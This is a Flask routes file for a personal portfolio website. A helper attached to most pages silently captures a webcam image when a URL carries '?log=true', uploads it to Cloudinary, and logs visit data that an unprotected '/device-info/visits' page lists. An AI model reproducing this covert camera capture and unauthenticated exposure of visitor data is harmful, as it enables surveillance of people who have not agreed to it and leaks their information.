# pages.py
from flask import Blueprint, redirect, url_for, render_template, request, jsonify
from Services.PortfolioService import PortfolioService
from Services.VisitService import VisitService
from utils import filter_data, paginate_data
from config import (
    ADD_PORTFOLIO_PAGE,
    CONCERN_PAGE,
    GALLERY_PAGE,
    IMAGE_PATH,
    PROFILE_IMAGE,
    PROFILE_PAGE,
    RESUME_PDF,
    VLOG_PAGE,
    DEVICE_INFO_VISIT_PAGE,
    DONATION_PAGE,
    get_locale,
)
from flask_babel import gettext  # type: ignore
from markupsafe import escape  # type: ignore
import requests
from datetime import datetime
import cloudinary.uploader
from dotenv import load_dotenv
import cv2
import os
import cloudinary

load_dotenv()

# Create a Blueprint for pages
pages_bp = Blueprint("pages", __name__)

# Initialize Services
portfolio_service = PortfolioService()
visit_service = VisitService()

# ************************** PAGES ********************************


@pages_bp.route("/")
def index():
    return handle_log_parameter() or redirect(url_for("pages.profile"))


@pages_bp.route("/profile")
def profile():
    profile_name = gettext("profile_name")
    profile_intro = gettext("profile_intro")
    profile_age = gettext("profile_age")
    profile_introvert = gettext("profile_introvert")
    profile_job = gettext("profile_job")
    profile_goals = gettext("profile_goals")
    profile_desc = f"{escape(profile_intro)} {escape(profile_age)}<br>{escape(profile_introvert)}<br>{escape(profile_job)} {escape(profile_goals)}"

    project_jaom = url_for("static", filename="images/jaom.png", _external=True)
    no_project = url_for("static", filename="images/no-project.png", _external=True)

    return handle_log_parameter() or render_template(
        PROFILE_PAGE,
        profile_image=PROFILE_IMAGE,
        resume_pdf=RESUME_PDF,
        title="My Portfolio",
        profile_name=profile_name,
        profile_desc=profile_desc,
        project_jaom=project_jaom,
        no_project=no_project,
    )


@pages_bp.route("/gallery")
def gallery():
    gallery_url = url_for("static", filename="json/gallery.json", _external=True)

    response = requests.get(gallery_url)
    gallery_data = response.json()

    search_query = request.args.get("search", "")
    filtered_gallery_data = filter_data(gallery_data, get_locale(), search_query)

    page = request.args.get("page", 1, type=int)
    items_per_page = 6
    paginated_gallery_data, total_pages = paginate_data(
        filtered_gallery_data, page, items_per_page
    )

    return handle_log_parameter() or render_template(
        GALLERY_PAGE,
        image_path=IMAGE_PATH,
        gallery_data=paginated_gallery_data,
        current_page=page,
        total_pages=total_pages,
        title="My Gallery",
        search_query=search_query,
    )


@pages_bp.route("/vlog")
def vlog():
    vlog_url = url_for("static", filename="json/vlog.json", _external=True)
    response = requests.get(vlog_url)
    vlog_data = response.json()

    search_query = request.args.get("search", "")
    filtered_vlog_data = filter_data(vlog_data, get_locale(), search_query)

    page = request.args.get("page", 1, type=int)
    items_per_page = 3
    paginated_vlog_data, total_pages = paginate_data(
        filtered_vlog_data, page, items_per_page
    )

    return handle_log_parameter() or render_template(
        VLOG_PAGE,
        vlogs=paginated_vlog_data,
        current_page=page,
        total_pages=total_pages,
        title="My Vlogs",
        search_query=search_query,
    )


@pages_bp.route("/concern")
def concern():
    return handle_log_parameter() or render_template(CONCERN_PAGE, title="My Concern")


@pages_bp.route("/change_language/<lang_code>")
def change_language(lang_code):
    referrer_url = request.referrer if request.referrer else url_for("index")

    response = redirect(
        f"{referrer_url.split('?')[0]}?search="
    )
    response.set_cookie("lang", lang_code)
    return response


@pages_bp.route("/add_portfolio_form")
def add_portfolio_form():
    return handle_log_parameter() or render_template(ADD_PORTFOLIO_PAGE)


@pages_bp.route("/add_portfolio", methods=["POST"])
def add_portfolio():
    data = {
        "name": request.form.get("name"),
        "email": request.form.get("email"),
    }

    try:
        portfolio_service.add_portfolio(data["name"], data["email"])
        return jsonify({"message": "Data inserted successfully!"}), 201
    except Exception as e:
        return jsonify({"error": str(e)}), 400

@pages_bp.route("/donation")
def donation():
    return handle_log_parameter() or render_template(DONATION_PAGE)

@pages_bp.route("/device-info/visits")
def device_info():
    page = int(request.args.get("page", 1))
    per_page = 10
    documents, total_docs = visit_service.get_paginated_system_info(page, per_page)
    total_pages = (total_docs + per_page - 1) // per_page

    return handle_log_parameter() or render_template(
        DEVICE_INFO_VISIT_PAGE,
        documents=[doc.to_dict() for doc in documents],
        current_page=page,
        total_pages=total_pages,
        title="User Visits",
    )


# ************************** PRIVATE FUNCTIONS ********************************
def handle_log_parameter():
    log_query = request.args.get("log", "").lower()
    if log_query == "true":
        cloudinary_url, error = capture_image()
        print(cloudinary_url)
        print(error)
        
        result = portfolio_service.add_system_info(cloudinary_url=cloudinary_url)
        print(result)
        return redirect(url_for(request.endpoint))

    return None

# Configure Cloudinary
cloudinary.config(
    cloud_name=os.getenv('CLOUDINARY_CLOUD_NAME'),
    api_key=os.getenv('CLOUDINARY_API_KEY'),
    api_secret=os.getenv('CLOUDINARY_API_SECRET')
)

def capture_image(save_dir="captured_images"):
    # Create the directory to save images if it doesn't exist (optional, as we're uploading to Cloudinary)
    os.makedirs(save_dir, exist_ok=True)
    
    # Open the webcam
    cap = cv2.VideoCapture(0)

    # Check if the webcam is opened correctly
    if not cap.isOpened():
        return None, "Error: Could not access the camera."

    # Capture a frame
    ret, frame = cap.read()
    if ret:
        # Save the image temporarily to upload to Cloudinary
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = os.path.join(save_dir, f"capture_{timestamp}.jpg")
        cv2.imwrite(filename, frame)  # Save image locally for temporary upload

        try:
            upload_result = cloudinary.uploader.upload(
                filename,
                folder="capture_images"  # Specify the folder name on Cloudinary
            )
            cloudinary_url = upload_result['secure_url']  # Get the URL of the uploaded image
            os.remove(filename)  # Remove the temporary file after upload

            return cloudinary_url, None

        except Exception as e:
            os.remove(filename)  # Ensure the temporary file is deleted if an error occurs
            return None, f"Error uploading image to Cloudinary: {str(e)}"

    cap.release()
    return None, "Error: Failed to capture image."
